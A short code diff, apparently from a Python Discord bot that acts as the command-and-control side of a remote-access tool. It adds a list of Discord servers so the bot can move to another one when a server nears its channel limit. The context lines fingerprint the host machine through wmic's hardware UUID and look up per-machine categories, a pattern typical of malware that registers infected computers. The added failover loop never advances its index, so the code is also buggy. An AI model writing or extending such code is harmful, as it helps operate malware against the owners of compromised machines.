@@ -24,7 +24,7 @@ turned_off = False
 # end of area
 
 bot_token = ""
-guild_id = int
+guild_ids = []
 channel_ids = {                                                    
     'info': '',                                                  
     'main': '',                                                                                                  
@@ -33,8 +33,16 @@ channel_ids = {
 
 @client.event
 async def on_ready():
-    global channel_ids, category
+    global category, guild_id
     first_run = True
+    guild_id_index = 1
+    guild_id = guild_ids[guild_id_index]
+        
+    for _ in guild_ids:
+        get_guild = client.get_guild(guild_id)
+        channel_count = len(get_guild.channels)
+        if channel_count > 495:
+            guild_id = guild_ids[guild_id_index + 1]
 
     hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().split('\n')[1].strip()
     for category_name in client.get_guild(guild_id).categories:
